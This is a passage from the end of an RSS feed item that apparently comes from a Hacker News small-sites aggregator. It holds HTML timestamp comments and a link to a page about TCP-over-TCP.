<!-- Created: Sun Oct 10 20:56:27 CEST 1999 -->
<!-- hhmts start -->
Last modified: Mon Apr 23 11:50:59 CEST 2001
<!-- hhmts end -->
  

</div>]]>
            </description>
            <link>http://sites.inka.de/~bigred/devel/tcp-tcp.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25080693</guid>
            <pubDate>Fri, 13 Nov 2020 09:43:06 GMT</pubDate>
        </item>
    </channel>
</rss>
